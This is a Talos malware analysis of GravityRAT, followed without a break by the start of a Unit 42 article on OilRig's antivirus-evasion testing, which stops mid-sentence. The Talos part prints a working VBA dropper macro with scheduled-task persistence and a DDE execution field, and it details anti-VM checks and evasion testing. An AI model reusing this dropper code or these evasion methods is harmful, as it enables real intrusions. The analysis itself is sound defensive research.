"Talos Blog || Cisco Talos Intelligence Group - Comprehensive Threat Intelligence: GravityRAT - The Two-Year Evolution Of An APT Targeting India Software Vulnerability Information Vulnerability Information BACK Vulnerability Reports Microsoft Advisories Reputation Center Reputation Center BACK IP & Domain Reputation Talos File Reputation Reputation Support AMP Threat Naming Conventions IP Blacklist Download AWBO Exercises Categories Library Support Communities Support Communities BACK Snort Community ClamAV Community Reputation Center Support SpamCop Careers Blog About Thursday, April 26, 2018 GravityRAT - The Two-Year Evolution Of An APT Targeting India This blog post is authored by Warren Mercer and Paul Rascagneres. Update: 4/30 Since the publication of the blog post, one of the anti-VM capability was commented a lot on Twitter: the detection of Virtual Machines by checking the temperature of the system. We decided to add more details and clarifications concerning this feature. GravityRAT uses a WMI request in order to get the current temperature of the hardware. Here is the output of the query on a physical machine (a Surface Book): The query returns the temperature of 7 thermal zones. Here is the output on a Virtual Machine executed by Hyper-V on the same hardware: The feature is not supported. The malware author used this behavior in order to identify VM (such as Sandboxes). From our tests and the feedback from several researchers, this monitoring is not supported on Hyper-V, VMWare Fusion, VirtualBox, KVM and XEN. It's important to notice that several recent physical systems do not support it (a researcher reported some Lenovo and Dell hosts did not support this). It means that GravityRAT will consider this physical machine as VMs. Importantly to note this check is not foolproof as we have identified physical hosts which do not report back the temperature, however, it should also be considered a check that is identifying a lot of virtual environments. This is particularly important due to the amount of sandboxing & malware detonation being carried out within virtual environments by researchers. Summary Today, Cisco Talos is uncovering a new piece of malware, which has remained under the radar for the past two years while it continues to be developed. Several weeks ago, we identified the use of the latest version of this RAT (Remote Access Tool). In this article, we will discuss the technical capabilities, the evolution, development and potential attribution of what we are calling GravityRAT. GravityRAT has been under ongoing development for at least 18 months, during which the developer has implemented new features. We've seen file exfiltration, remote command execution capability and anti-vm techniques added throughout the life of GravityRAT. This consistent evolution beyond standard remote code execution is concerning because it shows determination and innovation by the actor. Throughout our investigation, we observed several malicious documents used to attack victims, which we will discuss. These malicious documents were used by the developer to run several tests on the popular analysis platform VirusTotal. Using VirusTotal allowed the developer to make changes in an attempt to decrease antivirus detection. Although GravityRAT has not been previously published or discussed, there was some information from the National Computer Emergency Response Team (CERT) of India describing GravityRAT as being used in targeted attacks against India. Finally, we will discuss specific attribution elements discovered during our research into GravityRAT as we identify specific information, which we believe to be leaked by the developer, such as location, and potentially their first name. Infection Vectors Malicious Office Documents The majority of the malicious documents crafted by the malware author are Microsoft Office Word documents. The attacker uses an embedded macro in order to execute malicious code on the victim's system. The document opens and appears as such: The document asks to the user to enable macros in order to prove that the user is not a robot (similar to the CAPTCHA we often see on the internet). This, however, is a known tactic that a lot of Office-based malware uses. It is an attempt to trick any users who are using Protected Mode on their systems. By enabling macros, the malware is able to begin it's execution. We discovered that the embedded macro is quite small when extracted. Sub AutoOpen() If Not Dir(Environ(""TEMP"") + ""\\image4.exe"") <> """" Then Const lCancelled_c As Long = 0 Dim sSaveAsPath As String sSaveAsPath = CreateObject(""WScript.Shell"").ExpandEnvironmentStrings(""%Temp%"") + ""\\temporary.zip"" If VBA.LenB(sSaveAsPath) = lCancelled_c Then Exit Sub ActiveDocument.Save Application.Documents.Add ActiveDocument.FullName ActiveDocument.SaveAs sSaveAsPath ActiveDocument.Close Set app = CreateObject(""Shell.Application"") ExtractTo = CreateObject(""WScript.Shell"").ExpandEnvironmentStrings(""%Temp%"") ExtractByExtension app.NameSpace(Environ(""TEMP"") + ""\\temporary.zip""), ""exe"", ExtractTo End If End Sub Sub ExtractByExtension(fldr, ext, dst) Set FSO = CreateObject(""Scripting.FileSystemObject"") Set app = CreateObject(""Shell.Application"") For Each f In fldr.Items If f.Type = ""File folder"" Then ExtractByExtension f.GetFolder, ext, dst ElseIf LCase(FSO.GetExtensionName(f.Name)) = LCase(ext) Then If Not Dir(Environ(""TEMP"") + ""\\image4.exe"") <> """" Then app.NameSpace(dst).CopyHere f.Path, &H4 End If End If Next Shell ""schtasks /create /tn wordtest /tr """"'%temp%\\image4.exe' 35"""" /sc DAILY /f /RI 10 /du 24:00 /st 00:01"" End Sub This macro contains three functions: The first one is executed when the document is opened. The purpose is to copy the active document (the opened Word document) in a temporary directory and to rename it as a ZIP archive. Indeed, the docx format is, in fact, a common ZIP archive, and can be unzipped using common tools. The second function decompresses this 'temporary.zip' file and extracts the .exe file stored in it. The third creates a scheduled task, named 'wordtest', to execute this malicious file every day. With this approach, the attacker ensures that there is no direct execution (the executable is executed thanks to scheduled tasks), there's no download of an additional payload, and finally, the author uses the fact that the docx format is an archive in order to include its executable (GravityRAT). Testing By The Author During our tracking, we identified several malicious documents submitted from this actor on VirusTotal for testing purposes. They tested the detection on macros (by modifying them, or by executing the calc instead of the malicious payload) and the developers tried dynamic data exchange (DDE) execution in the Office document. This is abusing the DDE protocol which exists within Microsoft Office documents. Whilst this is a feature Microsoft provide it is also a feature that an attacker can leverage for malicious activity, Microsoft published mitigation information here previously. The developer crafted Office Word and Excel documents to see the detection in VirusTotal. The authors tried to hide the DDE object in a different part of the document \xe2\x80\x94 in the main object and the header, for example. The DDE object simply executes Microsoft calc in the detected sample. Here is an example: <?xml version=""1.0"" encoding=""UTF-8"" standalone=""yes""?> <w:document [...redated...}] mc:Ignorable=""w14 w15 wp14""><w:body><w:p w:rsidR=""00215C91"" w:rsidRDefault=""008C166A""><w:r><w:fldChar w:fldCharType=""begin""/></w:r><w:r><w:instrText xml:space=""preserve""> </w:instrText></w:r><w:r><w:rPr><w:rFonts w:ascii=""Helvetica"" w:hAnsi=""Helvetica"" w:cs=""Helvetica""/><w:color w:val=""383838""/><w:spacing w:val=""3""/><w:sz w:val=""26""/><w:szCs w:val=""26""/><w:shd w:val=""clear"" w:color=""auto"" w:fill=""FFFFFF""/></w:rPr><w:instrText>DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe ""/k calc.exe""</w:instrText></w:r><w:r><w:instrText xml:space=""preserve""> </w:instrText></w:r><w:r><w:fldChar w:fldCharType=""end""/></w:r><w:bookmarkStart w:id=""0"" w:name=""_GoBack""/><w:bookmarkEnd w:id=""0""/></w:p><w:sectPr w:rsidR=""00215C91""><w:pgSz w:w=""12240"" w:h=""15840""/><w:pgMar w:top=""1440"" w:right=""1440"" w:bottom=""1440"" w:left=""1440"" w:header=""720"" w:footer=""720"" w:gutter=""0""/><w:cols w:space=""720""/><w:docGrid w:linePitch=""360""/></w:sectPr></w:body></w:document> We believe the filenames of the submitted samples are clearly testing docs, using different methods and Office tricks to attempt to ensure his malware was undetected. Those names were: testnew1.docx Test123.docx test456.docx test2.docx book1test2.xlsx Test123.doc GravityRAT Our initial discovery of GravityRAT was through a malicious Word document. As explained previously, this Word document had various macros to deliver a final payload.Considering that this was the most recent version of the malware, we decided to ascertain how long this actor had been active, and how their attacks had evolved. We were able to discover four distinct versions of GravityRAT, developed over two years. Next, we will go through what we believe is the development life cycle and feature-addition mission carried out by this developer. Version G1 The malware author uses a versioning system starting by the G letter. The oldest version we identified is G1. Here is the PDB path of the sample: f:\\F\\Windows Work\\G1\\Adeel's Laptop\\G1 Main Virus\\systemInterrupts\\gravity\\obj\\x86\\Debug\\systemInterrupts.pdb You can notice the potential first name of the developers: Adeel. Of course, this information can be manipulated by the malware author. This sample was compiled in December 2016. The original filename of the sample was resume.exe. The purpose of this version was to steal information on the compromised system: MAC Address Computer name Username IP address Date Steal files with the following extensions: .docx, .doc, .pptx, .ppt, .xlsx, .xls, .rtf and .pdf The volumes mapped on the system All this information was then sent to one of the following domains: G1 also had the ability to execute commands remotely on the infected host machine at the author's will. Version G2 We identified a new variant used in July 2017 named G2. Here is the PDB of the sample: e:\\Windows Work\\G2\\G2 Main Virus\\Microsoft Virus Solutions (G2 v5) (Current)\\Microsoft Virus Solutions\\obj\\Debug\\Windows Wireless 802.11.pdb For this version, the developer modified the architecture of the malware. The main code aims to load and execute two additional .NET binaries stored in the resources of the file: The first resource is a legitimate open-source library available on GitHub. It's a .NET wrapper for the Windows Task Scheduler The second is the G2 version of GravityRAT This variant shares the same command and control (C2) servers as G1, however, we have an additional 'payload' variable added to G2. This variant has almost identical capabilities as the previous, except one additional functionality: It collects the CPU information in the Win32_Processor entry via WMI request (Processor ID, Name, Manufacturer and the clock speed). The attacker is most likely using this information as part of an anti-vm attempt within this malware. This is used to try and thwart analysis in virtual environments. In a slight change to the previous variant, the new payloads are executed with a Windows Scheduled Task. This would explain the inclusion of the .NET wrapper. The analysed sample contained a decoy picture document in the resource section: Version G3 In August 2017, the author of GravityRAT used a new variant of its malware, G3. Here is the PDB: F:\\Projects\\g3\\G3 Version 4.0\\G3\\G3\\obj\\Release\\Intel Core.pdb This variant uses the same method as G2, and includes a legitimate library in the resource section. The developers also added additional language support to the library: German Spanish French Italian Chinese The author changed the backend of the C2 server with this variant. The URI changed too, it contains the GravityRAT variant name: August was also the same month NIC CERT notified potential victims that GravityRAT had been used in a targeted campaign. Given the ongoing development nature of this malware, it meant another variant was most likely due. Version GX The latest version of GravityRAT was created in December 2017 named GX. Here is the PDB: C:\\Users\\The Invincible\\Desktop\\gx\\gx-current-program\\LSASS\\obj\\Release\\LSASS.pdb This version is the most advanced variant of GravityRAT. Throughout the evolution, we saw this malware embedding open-source legitimate .NET libraries (for schedule tasks, compression, encryption, .NET loading). It contains a resource named ""important."" This is an archive with a password. This variant has the same features as before, but this time, some new features are added: It collects open ports on the victim host by running the netstat command It lists all the running processes It lists available services on the system It exfiltrates .ppt and .pptx file, in addition to the extension mentioned in the G1 variant If a USB key is connected on the system, the malware steals the file based on an extension list It supports file encryption (AES with the key ""lolomycin2017"") It collects information on the account (account type, description, domain name, full name, SID and status) It checks if the system is a virtual machine with several techniques The developer implemented a total of seven techniques to identify if the compromised system is a virtual machine. The first technique consists of looking at any additional tools used by the hypervisor that are installed on the system (by checking a registry key): The second technique uses a WMI request to the BIOS version (Win32_BIOS entry). If the response contains: ""VMware"", ""Virtual"", ""XEN"", ""Xen"" or ""A M I"" the system is considered as a virtual machine. Additionally, the malware checks the SerialNumber and the version of the BIOS. The third technique uses the Win32_Computer entry in WMI. It checks if the manufacturer contains ""VIRTUAL"", ""VMWARE"" or ""VirtualBox"". The fourth technique checks the Processor ID of the system. The fifth technique counts the number of cores in the infected system (the author expects more than one core) The sixth technique checks the current CPU temperature of the system (the MSAcpi_ThermalZoneTemperature entry). Indeed, some hypervisors (VMWare, VirtualBox and Hyper-V) do not support temperature check. The WMI request simply replies ""not supported"". This behaviour can be used to detect if the targeted system is a real machine. The last technique uses the MAC Address of the infected system. If the MAC Address starts by a well-known hexadecimal number, the system is identified as a virtual machine. The C2 servers communication is performed in HTTP as it did previously. The variant version of GX is used in the URI. The C2 servers we can see are shared with the previous variants: What we know about the author Below, we will present evidence that we have obtained regarding the attacker and the associated malware. Obviously, attribution is a complex field. The developers could be using a proxy or a VPN in order to fake the origin of the submission. But, we will still simply present some facts concerning this actor. The developer used at least two different usernames in the past two years: ""The Invincible"" and ""TheMartian."" In the oldest version of GravityRAT, the attacker potentially leaked his or her first name in the PDB: ""Adeel"" \xe2\x80\x94 the path contained ""Adeel's Laptop"". Additionally, all the malicious Office documents, and more specifically the documents used to test anti-virus on VirusTotal, were submitted from Pakistan. One of the four PE files in the IOCs section was sent from Pakistan, too. In August 2017, NIC CERT published an advisory about malicious targeted campaigns. This advisory mentions the C2 server infrastructure of GravityRAT, which means the GravityRAT author likely targeted Indian entities/organisations. By leveraging Cisco Umbrella and using the Investigate tool, we were able to determine that across all of the C2 domains listed, we saw a large influx of traffic originating from India, as evidenced by NIC CERT, all of the C2 domains were at least 50 percent requested by Indian IP infrastructure. It is possible that some of the non-Indian IP space requests may artefacts be due to our own research. Conclusion This actor is probably not the most advanced actor we've seen. But he or she managed to stay under the radar since 2016. They worked on malicious code, and produced four variants. Each new variant included new features. The developer used the same C2 infrastructure all this time. The developer was clever enough to keep this infrastructure safe, and not have it blacklisted by a security vendor. The actor took their time to ensure they were not within a virtual environment to avoid analysis. However, they did not take any time at all to attempt to obfuscate their .NET code. The code was largely trivial to reverse engineer, which meant static analysis was an easy option for this piece of malware. NIC CERT published an advisory about this actor, which suggest they targeted Indian entities and organizations. The author leaked information within the samples (i.e. Adeel) and on the VirusTotal platform. Thanks to this information, we we able to understand how they tested malicious documents in order to decrease detection ratios across many popular engines. During this testing period, all the samples were uploaded from Pakistan to VirusTotal. Coverage Additional ways our customers can detect and block this threat are listed below. Advanced Malware Protection (AMP) is ideally suited to prevent the execution of the malware used by these threat actors. CWS or WSA web scanning prevents access to malicious websites and detects malware used in these attacks. Email Security can block malicious emails sent by threat actors as part of their campaign. Network Security appliances such as NGFW, NGIPS, and Meraki MX can detect malicious activity associated with this threat. AMP Threat Grid helps identify malicious binaries and build protection into all Cisco Security products. Umbrella, our secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs, and URLs, whether users are on or off the corporate network. Open Source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on Snort.org. IOCs Malicious Documents Macros 0beb2eb1214d4fd78e1e92db579e24d12e875be553002a778fb38a225cadb703 70dc2a4d9da2b3338dd0fbd0719e8dc39bc9d8e3e959000b8c8bb04c931aff82 835e759735438cd3ad8f4c6dd8b035a3a07d6ce5ce48aedff1bcad962def1aa4 C14f859eed0f4540ab41362d963388518a232deef8ecc63eb072d5477e151719 ed0eadd8e8e82e7d3829d71ab0926c409a23bf2e7a4ff6ea5b533c5defba4f2a f4806c5e4449a6f0fe5e93321561811e520f738cfe8d1cf198ef12672ff06136 Other Malicious Documents (DDE) 911269e72cd6ed4835040483c4860294d26bfb3b351df718afd367267cd9024f fb7aa28a9d8fcfcabacd7f390cee5a5ed67734602f6dfa599bff63466694d210 ef4769606adcd4f623eea29561596e5c0c628cb3932b30428c38cfe852aa8301 cd140cf5a9030177316a15bef19745b0bebb4eb453ddb4038b5f15dacfaeb3a2 07682c1626c80fa1bb33d7368f6539edf8867faeea4b94fedf2afd4565b91105 GravityRAT G1 9f30163c0fe99825022649c5a066a4c972b76210368531d0cfa4c1736c32fb3a G2 1993f8d2606c83e22a262ac93cc9f69f972c04460831115b57b3f6244ac128bc G3 99dd67915566c0951b78d323bb066eb5b130cc7ebd6355ec0338469876503f90 GX 1c0ea462f0bbd7acfdf4c6daf3cb8ce09e1375b766fbd3ff89f40c0aa3f4fc96 C2 Servers hxxp://cone[.]msoftupdates.com:46769 hxxp://ctwo[.]msoftupdates.com:46769 hxxp://cthree[.]msoftupdates.com:46769 hxxp://eone[.]msoftupdates.eu:46769 hxxp://etwo[.]msoftupdates.eu:46769 hxxp://msupdates[.]mylogisoft.com:46769 hxxp://coreupdate[.]msoftupdates.com:46769 hxxp://updateserver[.]msoftupdates.eu:46769 msoftupdates[.]com msoftupdates[.]eu mylogisoft[.]com URI: /Gvty@/1ns3rt_39291384.php /Gvty@/newIns3rt.php /Gvty@/payloads /Gvty@/ip.php /G3/ServerSide/G3.php /G3/Payload/ /GX/GX-Server.php /GetActiveDomains.php Posted by Paul Rascagneres at 11:11 AM Labels: .NET, APT, GravityRAT, India, macros, MalDoc, Malware Analysis Share This Post No comments: Post a Comment Newer Post Older Post Home Subscribe to: Post Comments (Atom) Subscribe To Our Feed Posts Comments Subscribe via Email Blog Archive \xe2\x96\xba\xc2 2019 (191) \xe2\x96\xba\xc2 September (18) \xe2\x96\xba\xc2 August (21) \xe2\x96\xba\xc2 July (23) \xe2\x96\xba\xc2 June (16) \xe2\x96\xba\xc2 May (25) \xe2\x96\xba\xc2 April (25) \xe2\x96\xba\xc2 March (24) \xe2\x96\xba\xc2 February (19) \xe2\x96\xba\xc2 January (20) \xe2\x96\xbc\xc2 2018 (198) \xe2\x96\xba\xc2 December (16) \xe2\x96\xba\xc2 November (15) \xe2\x96\xba\xc2 October (26) \xe2\x96\xba\xc2 September (16) \xe2\x96\xba\xc2 August (12) \xe2\x96\xba\xc2 July (20) \xe2\x96\xba\xc2 June (15) \xe2\x96\xba\xc2 May (15) \xe2\x96\xbc\xc2 April (21) Threat Roundup for April 20-27 GravityRAT - The Two-Year Evolution Of An APT Targ... Vulnerability Spotlight: Hyland Perceptive Documen... Cryptomining Campaign Returns Coal and Not Diamond... Beers with Talos EP27: Smart Install, Vuln Process... Vulnerability Spotlight: Multiple Issues in Foxit ... Updates for BASS Vulnerability Spotlight: Foscam IP Video Camera Fi... Threat Roundup for April 6 - 13 Vulnerability Spotlight: Multiple Vulnerabilities ... Malware monitor - leveraging PyREBox for malware a... Vulnerability Spotlight: TALOS-2018-0529-531 - Mul... Vulnerability Spotlight: Multiple Simple DirectMed... Vulnerability Spotlight: Multiple Computerinsel Ph... Microsoft Patch Tuesday - April 2018 IcedID Banking Trojan Teams up with Ursnif/Dreambo... Beers with Talos EP26: Talos is Holding a Conferen... Critical Infrastructure at Risk: Advanced Actors T... Vulnerability Spotlight: Natus NeuroWorks Multiple... Vulnerability Spotlight: Moxa AWK-3131A Multiple F... Fake AV Investigation Unearths KevDroid, New Andro... \xe2\x96\xba\xc2 March (10) \xe2\x96\xba\xc2 February (14) \xe2\x96\xba\xc2 January (18) \xe2\x96\xba\xc2 2017 (171) \xe2\x96\xba\xc2 December (9) \xe2\x96\xba\xc2 November (11) \xe2\x96\xba\xc2 October (15) \xe2\x96\xba\xc2 September (17) \xe2\x96\xba\xc2 August (16) \xe2\x96\xba\xc2 July (14) \xe2\x96\xba\xc2 June (14) \xe2\x96\xba\xc2 May (19) \xe2\x96\xba\xc2 April (17) \xe2\x96\xba\xc2 March (17) \xe2\x96\xba\xc2 February (12) \xe2\x96\xba\xc2 January (10) \xe2\x96\xba\xc2 2016 (98) \xe2\x96\xba\xc2 December (9) \xe2\x96\xba\xc2 November (8) \xe2\x96\xba\xc2 October (11) \xe2\x96\xba\xc2 September (8) \xe2\x96\xba\xc2 August (8) \xe2\x96\xba\xc2 July (9) \xe2\x96\xba\xc2 June (10) \xe2\x96\xba\xc2 May (6) \xe2\x96\xba\xc2 April (12) \xe2\x96\xba\xc2 March (7) \xe2\x96\xba\xc2 February (6) \xe2\x96\xba\xc2 January (4) \xe2\x96\xba\xc2 2015 (62) \xe2\x96\xba\xc2 December (3) \xe2\x96\xba\xc2 November (3) \xe2\x96\xba\xc2 October (6) \xe2\x96\xba\xc2 September (6) \xe2\x96\xba\xc2 August (5) \xe2\x96\xba\xc2 July (4) \xe2\x96\xba\xc2 June (6) \xe2\x96\xba\xc2 May (3) \xe2\x96\xba\xc2 April (7) \xe2\x96\xba\xc2 March (8) \xe2\x96\xba\xc2 February (7) \xe2\x96\xba\xc2 January (4) \xe2\x96\xba\xc2 2014 (67) \xe2\x96\xba\xc2 December (4) \xe2\x96\xba\xc2 November (5) \xe2\x96\xba\xc2 October (6) \xe2\x96\xba\xc2 September (10) \xe2\x96\xba\xc2 August (4) \xe2\x96\xba\xc2 July (3) \xe2\x96\xba\xc2 June (6) \xe2\x96\xba\xc2 May (4) \xe2\x96\xba\xc2 April (10) \xe2\x96\xba\xc2 March (4) \xe2\x96\xba\xc2 February (3) \xe2\x96\xba\xc2 January (8) \xe2\x96\xba\xc2 2013 (30) \xe2\x96\xba\xc2 December (3) \xe2\x96\xba\xc2 November (2) \xe2\x96\xba\xc2 October (5) \xe2\x96\xba\xc2 September (2) \xe2\x96\xba\xc2 August (2) \xe2\x96\xba\xc2 July (3) \xe2\x96\xba\xc2 June (1) \xe2\x96\xba\xc2 May (2) \xe2\x96\xba\xc2 April (1) \xe2\x96\xba\xc2 March (1) \xe2\x96\xba\xc2 February (3) \xe2\x96\xba\xc2 January (5) \xe2\x96\xba\xc2 2012 (53) \xe2\x96\xba\xc2 December (3) \xe2\x96\xba\xc2 November (1) \xe2\x96\xba\xc2 October (2) \xe2\x96\xba\xc2 September (6) \xe2\x96\xba\xc2 August (7) \xe2\x96\xba\xc2 July (7) \xe2\x96\xba\xc2 June (4) \xe2\x96\xba\xc2 May (6) \xe2\x96\xba\xc2 April (5) \xe2\x96\xba\xc2 March (3) \xe2\x96\xba\xc2 February (7) \xe2\x96\xba\xc2 January (2) \xe2\x96\xba\xc2 2011 (23) \xe2\x96\xba\xc2 December (1) \xe2\x96\xba\xc2 November (4) \xe2\x96\xba\xc2 October (3) \xe2\x96\xba\xc2 September (1) \xe2\x96\xba\xc2 August (2) \xe2\x96\xba\xc2 July (3) \xe2\x96\xba\xc2 June (1) \xe2\x96\xba\xc2 May (2) \xe2\x96\xba\xc2 April (1) \xe2\x96\xba\xc2 March (2) \xe2\x96\xba\xc2 February (1) \xe2\x96\xba\xc2 January (2) \xe2\x96\xba\xc2 2010 (93) \xe2\x96\xba\xc2 December (4) \xe2\x96\xba\xc2 November (2) \xe2\x96\xba\xc2 October (4) \xe2\x96\xba\xc2 September (7) \xe2\x96\xba\xc2 August (9) \xe2\x96\xba\xc2 July (11) \xe2\x96\xba\xc2 June (12) \xe2\x96\xba\xc2 May (5) \xe2\x96\xba\xc2 April (12) \xe2\x96\xba\xc2 March (10) \xe2\x96\xba\xc2 February (7) \xe2\x96\xba\xc2 January (10) \xe2\x96\xba\xc2 2009 (146) \xe2\x96\xba\xc2 December (14) \xe2\x96\xba\xc2 November (10) \xe2\x96\xba\xc2 October (12) \xe2\x96\xba\xc2 September (13) \xe2\x96\xba\xc2 August (9) \xe2\x96\xba\xc2 July (19) \xe2\x96\xba\xc2 June (11) \xe2\x96\xba\xc2 May (13) \xe2\x96\xba\xc2 April (10) \xe2\x96\xba\xc2 March (11) \xe2\x96\xba\xc2 February (13) \xe2\x96\xba\xc2 January (11) \xe2\x96\xba\xc2 2008 (37) \xe2\x96\xba\xc2 December (12) \xe2\x96\xba\xc2 November (6) \xe2\x96\xba\xc2 October (7) \xe2\x96\xba\xc2 September (6) \xe2\x96\xba\xc2 August (3) \xe2\x96\xba\xc2 May (3) Recommended Blogs Cisco Blog Emotet is back after a summer break Snort Blog Snort OpenAppID Detectors have been updated ClamAV\xc2\xae blog ClamAV 0.102.0 Release Candidate is now available Software Reputation Center Vulnerability Information Microsoft Advisory Snort Rules IP Blacklist Download AMP Naming Conventions Talos File Reputation AWBO Exercises Library Support Communities About Careers Blog ThreatSource Newsletter Beers with Talos Podcast Connect With Us \xc2\xa9 Cisco Systems, Inc. and/or its affiliates. All rights reserved. View our Privacy Policy here.
"OilRig Actors Provide a Glimpse into Development and Testing Efforts Menu Tools Playbooks Speaking Events About Us OilRig Actors Provide a Glimpse into Development and Testing Efforts 18,811 people reacted 0 18 min. read Share By Robert Falcone April 27, 2017 at 1:00 PM Category: Unit 42 Tags: Clayside, Helminth, OilRig, OilRig attacks Throughout an attack campaign, actors will continue to develop their tools in an attempt to remain undetected and to carry out multiple attacks without having to completely retool. In regard to the attack lifecycle, development of tools occurs in the weaponization/staging phase that precedes the delivery phase, of which is typically the first opportunity we see the actors\xe2\x80\x99 activities as they interact directly with their target. We have been presented with a rare opportunity to see some development activities from the actors associated with the OilRig attack campaign, a campaign Unit 42 has been following since May 2016. Recently we were able to observe these actors making modifications to their ClaySlide delivery documents in an attempt to evade antivirus detection. We have identified two separate testing efforts carried out by the OilRig actors, one occurring in June and one in November of 2016. The sample set associated with each of these testing activities is rather small, but the changes made to each of the files give us a chance to understand what modifications the actor performs in an attempt to evade detection. This testing activity also suggests that the threat group responsible for the OilRig attack campaign have an organized, professional operations model that includes a testing component to the development of their tools. Testing Activity, Analysis, and Methodology We collected two sets of ClaySlide samples that appear to be created during the OilRig actor\xe2\x80\x99s development phase of their attack lifecycle. The threat actor uploaded each of these files to a popular antivirus testing website to find out which vendors detected the file. The actor then made subtle modifications to the file and uploaded the newly created file to the same popular antivirus testing website in order to determine how to evade detection. The flowchart in Figure 1explains the process in which the threat actors followed during their testing activities. Figure 1 Flowchart describing the testing process carried out by OilRig actor Lucky for us, the threat actors do not modify the metadata within their delivery documents, which allows us to determine when the actor last modified each Word document. These untainted timestamps allow us to create a timeline that we can use to order the files as they were created by the actor. Our analysis methodology involves iteratively comparing each file with the next file in the timeline to determine the changes the actor made to the first file that resulted in the creation of the second file. The first testing activity we observed began with an initial sample created on June 13, 2016 with 17 subsequent files created for testing purposes that the actor created in a two-hour period on June 15, 2016. Table 1shows the samples we observed associated with the June 2016 testing activity, including the iteration, the last modified timestamp, the hash, the filename, and the antivirus detection rate of the newly created file. The first \xe2\x80\x9cttt.xls\xe2\x80\x9d file and the files with incrementing filenames have the same decoy contents, which is the reason we initially included this sample with this group despite the difference in naming. Also, the filename \xe2\x80\x9cttt.xls\xe2\x80\x9d contains the acronym for \xe2\x80\x9cto the top\xe2\x80\x9d, which is common usage in Internet forums and could depict the actor starting testing activities. Iteration Modified SHA256 Filename AV Base 2016:06:13 05:28:32 742a52084162d3789e19\xe2\x80\xa6 ttt.xls 4 1 2016:06:15 05:24:25 f1de7b941817438da2a4\xe2\x80\xa6 1.xls 6 2 2016:06:15 05:28:11 b142265bb4b902837d83\xe2\x80\xa6 2.xls 0 3 2016:06:15 05:30:45 2e226a0210a123ad8288\xe2\x80\xa6 3.xls 2 4 2016:06:15 05:33:11 299bc738d7b0292820d9\xe2\x80\xa6 4.xls 4 5 2016:06:15 05:39:55 6e62308b94455569b8a1\xe2\x80\xa6 5.xls 2 6 2016:06:15 05:42:20 d64b46cf42ea4a7bf291\xe2\x80\xa6 6.xls 1 7 2016:06:15 05:47:09 77f8a267357a8d237e0b\xe2\x80\xa6 8.xls 1 8 2016:06:15 05:52:50 92f429b6f9b8031b5fc6\xe2\x80\xa6 9.xls 3 9 2016:06:15 05:55:01 c2a386723d8f203e1228\xe2\x80\xa6 10.xls 2 10 2016:06:15 05:57:50 2fb6bce8fc2f531de183\xe2\x80\xa6 11.xls 2 11 2016:06:15 06:00:24 75b033a40a756e2536d0\xe2\x80\xa6 12.xls 2 12 2016:06:15 06:10:46 8bb8f2bada27d14be021\xe2\x80\xa6 13.xls 1 13 2016:06:15 06:13:30 3af6dfa4cebd82f48b66\xe2\x80\xa6 14.xls 2 14 2016:06:15 06:16:27 82239a4e18a67f7b2ba0\xe2\x80\xa6 15.xls 2 15 2016:06:15 06:19:45 938101a1a336ce0fff57\xe2\x80\xa6 16.xls 2 16 2016:06:15 07:02:49 5e9ddb25bde3719c392d\xe2\x80\xa6 ttt.xls 4 17 2016:06:15 07:39:53 4190a8b8e6fa7bc37712\xe2\x80\xa6 ttt.xls 0 Table 1 Samples associated with the June 2016 testing activities The second testing activity of ClaySlide delivery documents began with the actor creating a base sample on November 14, 2016, followed by six subsequent test files created within a 30-minute window on the following day. Table 2 shows the pertinent information related to the ClaySlide testing activity that occurred in November 2016. Again, there was an obvious difference in filenames at the beginning of this activity, but we included the first two samples in with this group based on the first two files initially sharing decoy contents, but more importantly sharing the same macro code and payload scripts as the initial testing sample with the filename of \xe2\x80\x9cweak.xls\xe2\x80\x9d. Iteration Modified SHA256 Filename AV Base 2016:11:14 04:15:57 ae40262d5fad4bc48066\xe2\x80\xa6 Tables[Update].xls 5 1 2016:11:15 07:53:50 16880db37c35d4b28e68\xe2\x80\xa6 33.xls 5 2 2016:11:15 07:56:09 47054a8d380c197a7f32\xe2\x80\xa6 weak.xls 5 3 2016:11:15 08:05:52 e9ccf7a3c1e24f173ae9\xe2\x80\xa6 weak.xls 3 4 2016:11:15 08:12:11 e3c6f13dc3079a828386\xe2\x80\xa6 weak.xls 3 5 2016:11:15 08:14:35 427ce6b04d4319eeb84d\xe2\x80\xa6 weak.xls 2 6 2016:11:15 08:19:55 18b603495f8344c02468\xe2\x80\xa6 weak.xls 2 Table 2 Samples associated with the November 2016 testing activity By analyzing the changes made to the ClaySlide delivery document during these two separate testing activities we were able to gain insight into the techniques used by the actors during the testing. Before reviewing the activities performed in the two testing sessions, the following high level observations can be made: Patterns in filenames emerge, with testing files having the same word or incrementing numbers for the filenames, or a set of testing files sharing the same exact filename Very structured approach, using a baseline test sample followed by small iterative changes Actor may also revert back to the baseline test sample and continue testing Changes made only a few minutes apart and can involve: Removal or location change of payload Modified decoy contents and sheet names Changes to function and variable names Removal of entire lines of code Obfuscating strings via concatenation or an alternate encoding (base64 or hexadecimal) Reordering of functions in the code In many cases, testing files are no longer functional due to: Removal of a required component(s) Replacement of variables with nonsensical values Use of encoded strings without ability to decode Testing activities ceases with a very low antivirus detection rate The number of vendors detecting the samples increases and decrease throughout the testing as the actor attempts to determine what the detection signatures are triggering on June 2016 Testing Activity In June 2016, an actor related to the OilRig campaign began a series of testing activities in an attempt to determine the portions of the ClaySlide macro code that antivirus vendors were using for detection purposes. These activities resulted in 17 different iterations of the ClaySlide delivery document, many of which no longer run properly due to the changes made within the files. We have included an exhaustive analysis of the June 2016 testing activity in Appendix A. In the June testing, the actor started by removing the malicious payload from the Excel delivery document to focus their testing on the malicious macro. The actor made many iterative changes during their testing of the macro, however, the actor began these changes by completely removing a block of the code that was responsible for saving the payload to the system and for creating the scheduled task to run the payload. The removal of this code brought the detection rate to 0, which told the actor that the antivirus detection rules were detecting these files based on these lines of code. The actor spent most of their subsequent efforts modifying portions of this code. Now that the actor knew the portion of the code that caused antivirus detection, the actor added that portion of the code back to the macro and made changes in attempt to determine the exact line of code that was detected. This process involved changing the commands used to create the payload and the scheduled task. The changes made to these two commands involved their complete removal, their replacement with non-functioning strings such as keyboard mashing and their equivalent strings in a variety of different encodings, including base64 and hexadecimal representation. The actor also changed the way these commands were executed as well, specifically by either using the WScript.Shell object directly or the object stored in a variable. The actor also uses intentional misspelling of commands, such as \xe2\x80\x9cpoawearshell\xe2\x80\x9d and \xe2\x80\x9cscshtassks\xe2\x80\x9d, as well as variations to the filenames for the payloads, such as \xe2\x80\x9cfiraeeye.vbs\xe2\x80\x9d instead of \xe2\x80\x9cfireeye.vbs\xe2\x80\x9d. After making changes to the commands above, the actor shifted their 